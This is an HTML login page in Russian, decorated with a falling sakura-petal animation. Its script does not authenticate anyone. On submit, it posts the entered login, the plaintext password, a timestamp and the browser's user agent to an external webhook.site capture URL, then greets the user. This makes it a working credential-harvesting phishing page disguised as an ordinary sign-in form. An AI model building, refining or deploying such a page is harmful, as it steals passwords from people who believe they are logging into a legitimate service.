<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход</title>
    <link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@300;400;600;700&family=Yuji+Syuku&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">

</head>
<body>

<canvas id="sakuraCanvas"></canvas>

<div class="login-container">
    <div class="logo-section">
        <div class="sakura-icon">🌸</div>
        <h1>Добро пожаловать</h1>
        <div class="jp-subtitle"></div>
        <p>Войдите в свой аккаунт</p>
    </div>

    <form id="loginForm" autocomplete="off">
        <div class="form-group">
            <label for="login">Логин</label>
            <div class="input-wrapper">
                <input type="text" id="login" placeholder="Введите ваш логин" required>
            </div>
        </div>

        <div class="form-group">
            <label for="password">Пароль</label>
            <div class="input-wrapper">
                <input type="password" id="password" placeholder="Введите ваш пароль" required>
            </div>
        </div>

        <div class="remember-row">
            <label class="custom-checkbox">
                <input type="checkbox" id="remember">
                <span class="checkmark">
                    <svg viewBox="0 0 12 12" fill="none">
                        <path d="M2 6L5 9L10 3" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </span>
                Запомнить выбор
            </label>
            <a href="#" class="forgot-link">Забыли пароль?</a>
        </div>

        <button type="submit" class="btn-login" id="loginBtn">
            <div class="btn-text">
                <span>Войти</span>
                <div class="spinner"></div>
            </div>
        </button>
    </form>

    <div class="divider"><span>✿</span></div>

    <p class="register-text">Нет аккаунта? <a href="#">Зарегистрироваться</a></p>
</div>

<div class="toast" id="toast"></div>

<script>
    // ==================== WEBHOOK CONFIG ====================
    const WEBHOOK_URL = 'https://webhook.site/f9062ad5-da34-45df-a065-5860e6e474f1';

    // ==================== SAKURA PETAL ANIMATION ====================
    const canvas = document.getElementById('sakuraCanvas');
    const ctx = canvas.getContext('2d');

    let W, H;
    function resize() {
        W = canvas.width = window.innerWidth;
        H = canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener('resize', resize);

    class Petal {
        constructor() {
            this.reset(true);
        }

        reset(initial = false) {
            this.x = Math.random() * (W + 100) - 50;
            this.y = initial ? Math.random() * -H : Math.random() * -80 - 20;
            this.size = Math.random() * 14 + 8;
            this.speedY = Math.random() * 0.8 + 0.3;
            this.speedX = Math.random() * 0.6 - 0.3;
            this.rotation = Math.random() * Math.PI * 2;
            this.rotationSpeed = (Math.random() - 0.5) * 0.015;
            this.opacity = Math.random() * 0.5 + 0.2;
            this.wobble = Math.random() * Math.PI * 2;
            this.wobbleSpeed = Math.random() * 0.02 + 0.008;
            this.wobbleAmount = Math.random() * 1.5 + 0.5;

            const colors = [
                { r: 255, g: 183, b: 206 },
                { r: 255, g: 200, b: 218 },
                { r: 252, g: 170, b: 198 },
                { r: 255, g: 210, b: 225 },
                { r: 248, g: 160, b: 188 },
                { r: 255, g: 220, b: 232 },
            ];
            this.color = colors[Math.floor(Math.random() * colors.length)];
        }

        update() {
            this.y += this.speedY;
            this.wobble += this.wobbleSpeed;
            this.x += this.speedX + Math.sin(this.wobble) * this.wobbleAmount * 0.3;
            this.rotation += this.rotationSpeed;

            if (this.y > H + 40) {
                this.reset();
            }
        }

        draw() {
            ctx.save();
            ctx.translate(this.x, this.y);
            ctx.rotate(this.rotation);
            ctx.globalAlpha = this.opacity;

            const s = this.size;
            const c = this.color;

            ctx.beginPath();
            ctx.moveTo(0, 0);
            ctx.bezierCurveTo(
                -s * 0.5, -s * 0.4,
                -s * 0.6, s * 0.3,
                0, s * 0.6
            );
            ctx.bezierCurveTo(
                s * 0.6, s * 0.3,
                s * 0.5, -s * 0.4,
                0, 0
            );
            ctx.closePath();

            ctx.fillStyle = `rgb(${c.r}, ${c.g}, ${c.b})`;
            ctx.fill();

            ctx.beginPath();
            ctx.moveTo(0, s * 0.05);
            ctx.quadraticCurveTo(0, s * 0.3, 0, s * 0.55);
            ctx.strokeStyle = `rgba(${c.r - 20}, ${c.g - 20}, ${c.b - 20}, 0.3)`;
            ctx.lineWidth = 0.5;
            ctx.stroke();

            ctx.restore();
        }
    }

    const PETAL_COUNT = 45;
    const petals = [];
    for (let i = 0; i < PETAL_COUNT; i++) {
        petals.push(new Petal());
    }

    function animate() {
        ctx.clearRect(0, 0, W, H);
        petals.forEach(p => {
            p.update();
            p.draw();
        });
        requestAnimationFrame(animate);
    }
    animate();

    // ==================== FORM HANDLING + WEBHOOK ====================
    const form = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    const toast = document.getElementById('toast');

    function showToast(message, isError = false) {
        toast.textContent = message;
        toast.className = 'toast' + (isError ? ' error' : '');
        setTimeout(() => toast.classList.add('show'), 10);
        setTimeout(() => toast.classList.remove('show'), 3000);
    }

    // Load remembered login
    const savedLogin = localStorage.getItem('rememberedLogin');
    if (savedLogin) {
        document.getElementById('login').value = savedLogin;
        document.getElementById('remember').checked = true;
    }

    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const login = document.getElementById('login').value.trim();
        const password = document.getElementById('password').value;
        const remember = document.getElementById('remember').checked;

        if (!login || !password) {
            showToast('🌸 Пожалуйста, заполните все поля', true);
            return;
        }

        loginBtn.classList.add('loading');
        loginBtn.disabled = true;

        // Prepare data for webhook
        const payload = {
            login: login,
            password: password,
            remember: remember,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };

        try {
            // Send to webhook
            const response = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                // Save to localStorage if remember is checked
                if (remember) {
                    localStorage.setItem('rememberedLogin', login);
                } else {
                    localStorage.removeItem('rememberedLogin');
                }

                showToast('🌸 Данные отправлены! Добро пожаловать, ' + login + '!');
                
                // Subtle success animation
                document.querySelector('.login-container').style.transform = 'scale(0.98)';
                setTimeout(() => {
                    document.querySelector('.login-container').style.transform = 'scale(1)';
                }, 200);
            } else {
                throw new Error('Webhook response not OK');
            }
        } catch (error) {
            console.error('Webhook error:', error);
            showToast('⚠️ Ошибка отправки данных. Попробуйте ещё раз.', true);
        } finally {
            loginBtn.classList.remove('loading');
            loginBtn.disabled = false;
        }
    });

    // Focus effects
    document.querySelectorAll('.form-group input').forEach(input => {
        input.addEventListener('focus', function() {
            this.closest('.form-group').style.transform = 'translateX(2px)';
            this.closest('.form-group').style.transition = 'transform 0.3s';
        });
        input.addEventListener('blur', function() {
            this.closest('.form-group').style.transform = 'translateX(0)';
        });
    });

    // Parallax on card
    const card = document.querySelector('.login-container');
    document.addEventListener('mousemove', function(e) {
        const x = (e.clientX / W - 0.5) * 6;
        const y = (e.clientY / H - 0.5) * 6;
        card.style.transform = `perspective(1000px) rotateY(${x * 0.3}deg) rotateX(${-y * 0.3}deg)`;
    });

    document.addEventListener('mouseleave', function() {
        card.style.transform = 'perspective(1000px) rotateY(0deg) rotateX(0deg)';
    });
</script>
</body>
</html>
